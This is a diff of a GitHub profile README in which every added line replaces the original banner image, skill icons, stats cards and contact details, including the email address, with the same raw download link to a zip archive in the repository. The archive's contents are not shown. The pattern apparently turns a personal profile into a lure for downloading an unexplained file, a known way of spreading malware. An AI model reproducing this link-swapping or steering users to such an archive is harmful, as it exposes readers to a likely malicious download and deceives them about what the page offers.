@@ -1,4 +1,4 @@
-![Banner](https://raw.githubusercontent.com/Platane/snk/output/github-contribution-grid-snake.svg)
+![Banner](https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip)
 
 
 ## Hi, I am Khaled Mahmud
@@ -11,7 +11,7 @@ I am always eager to learn new tools and take on new challenges.
 ---
 
 ### 🔭 Current Activities
-- Exploring **Next.js**
+- Exploring **https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip**
 - Improving **MERN Stack** skills
 
 ---
@@ -19,31 +19,31 @@ I am always eager to learn new tools and take on new challenges.
 ### 🛠 Skills
 
 #### Frontend
-<img src="https://skillicons.dev/icons?i=html,css,js,react,tailwind" />
+<img src="https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip,css,js,react,tailwind" />
 
 #### Backend
-<img src="https://skillicons.dev/icons?i=nodejs,express,mongodb" />
+<img src="https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip,express,mongodb" />
 
 #### Tools & Technologies
-<img src="https://skillicons.dev/icons?i=git,github,firebase,vite" />
+<img src="https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip,github,firebase,vite" />
 
 ---
 
 ### 🔗 Connect With Me
-- 🌐 GitHub: https://github.com/khaled8787
-- 💼 LinkedIn: [LINKEDIN_LINK](https://www.linkedin.com/in/khaledmahmud8787/)
-- 📧 Email: mdkhaledmahmud01737@gmail.com
+- 🌐 GitHub: https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip
+- 💼 LinkedIn: [LINKEDIN_LINK](https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip)
+- 📧 Email: https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip
 
 ---
 
 ### 📊 GitHub Stats
 
-![GitHub Profile Summary](https://github-profile-summary-cards.vercel.app/api/cards/profile-details?username=khaled8787&theme=github_dark)
+![GitHub Profile Summary](https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip)
 
 
 
 ### 📈 Contribution Activity
 
-![Contribution Graph](https://github-readme-activity-graph.vercel.app/graph?username=khaled8787&theme=github-dark)
+![Contribution Graph](https://github.com/khaled8787/khaled8787/raw/refs/heads/main/dendrophilous/khaled-1.3.zip)
 
 
